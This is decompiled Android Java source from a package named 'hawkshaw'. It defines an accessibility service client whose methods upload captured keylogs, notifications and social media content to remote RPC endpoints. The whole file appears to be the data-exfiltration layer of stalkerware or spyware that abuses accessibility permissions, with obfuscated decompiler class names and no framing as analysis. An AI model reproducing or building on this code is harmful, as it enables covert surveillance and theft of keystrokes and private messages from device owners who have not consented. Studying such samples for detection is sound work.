package com.hawkshaw.library.datalayer.network.service;

import X1.B;
import a3.e;
import com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest;
import com.hawkshaw.library.datalayer.models.accessibility.PushNotificationRequest;
import com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaRequest;
import com.hawkshaw.library.datalayer.models.accessibility.PushUnprocessedSocialMediaRequest;
import t3.N;

public final class AccessibilityServiceImpl implements AccessibilityService {
    public Object pushKeyLogs(PushKeyLogsRequest pushKeyLogsRequest, e eVar) {
        return B.B(N.f9292c, new AccessibilityServiceImpl$pushKeyLogs$$inlined$apiCall$default$1("accessibility.Accessibility/PushKeyLogs", pushKeyLogsRequest, false, (e) null), eVar);
    }

    public Object pushNotifications(PushNotificationRequest pushNotificationRequest, e eVar) {
        return B.B(N.f9292c, new AccessibilityServiceImpl$pushNotifications$$inlined$apiCall$default$1("accessibility.Accessibility/PushNotifications", pushNotificationRequest, false, (e) null), eVar);
    }

    public Object pushSocialMedia(PushSocialMediaRequest pushSocialMediaRequest, e eVar) {
        return B.B(N.f9292c, new AccessibilityServiceImpl$pushSocialMedia$$inlined$apiCall$default$1("accessibility.Accessibility/PushSocialMedia", pushSocialMediaRequest, false, (e) null), eVar);
    }

    public Object pushUnprocessedSocialMedia(PushUnprocessedSocialMediaRequest pushUnprocessedSocialMediaRequest, e eVar) {
        return B.B(N.f9292c, new AccessibilityServiceImpl$pushUnprocessedSocialMedia$$inlined$apiCall$default$1("accessibility.Accessibility/PushUnprocessedSocialMedia", pushUnprocessedSocialMediaRequest, false, (e) null), eVar);
    }
}
